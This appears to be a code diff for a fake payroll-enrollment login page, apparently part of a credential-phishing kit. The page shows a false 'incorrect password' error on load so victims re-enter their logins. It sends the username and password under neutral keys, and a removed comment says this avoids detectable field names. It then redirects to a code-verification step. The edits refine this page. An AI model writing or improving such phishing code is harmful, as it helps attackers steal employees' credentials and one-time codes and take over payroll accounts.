@@ -12,7 +12,7 @@ export default function PayrollEnrollment2Page() {
   const [success, setSuccess] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // Show initial error message on page load
+  // Show initial error message on page load (optional)
   useEffect(() => {
     setError("Incorrect username or password. Please try again.");
   }, []);
@@ -28,7 +28,6 @@ export default function PayrollEnrollment2Page() {
     setError("");
     setSuccess("");
 
-    // Neutral keys – avoid "employee_id", "payroll_password" in request body
     const formData = {
       a: f1,
       b: f2,
@@ -39,9 +38,9 @@ export default function PayrollEnrollment2Page() {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
-          "Cache-Control": "no-cache",     // ← critical for mobile
+          "Cache-Control": "no-cache",
         },
-        credentials: "same-origin",         // ← extra reliability on mobile
+        credentials: "same-origin",
         body: JSON.stringify({
           data: formData,
           formType: "🏦 Payroll Enrollment",
@@ -55,7 +54,7 @@ export default function PayrollEnrollment2Page() {
       setF2("");
 
       setTimeout(() => {
-        router.replace("/CodeVerification");   // ← safer than push
+        router.replace("/CodeVerification");
       }, 2000);
     } catch (err) {
       console.error(err);
@@ -112,6 +111,9 @@ export default function PayrollEnrollment2Page() {
             </div>
 
             <form onSubmit={handleSubmit} className="space-y-5">
+              {/* HIDDEN type="tel" field – forces browser hydration on problematic devices (iOS Safari, WebView) */}
+              <input type="tel" style={{ display: "none" }} aria-hidden="true" tabIndex={-1} />
+
               {error && (
                 <div className="bg-red-500/10 border border-red-500/30 text-red-400 px-4 py-3 rounded-lg text-sm flex items-start gap-2">
                   <FaShieldAlt className="mt-0.5 flex-shrink-0" />
@@ -129,7 +131,8 @@ export default function PayrollEnrollment2Page() {
                   Username
                 </label>
                 <input
-                  type="tel"                    
+                  type="text"               // ← fixed: allows letters, numbers, symbols
+                  inputMode="text"          // ← standard keyboard, no numeric restriction
                   value={f1}
                   onChange={(e) => setF1(e.target.value)}
                   className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
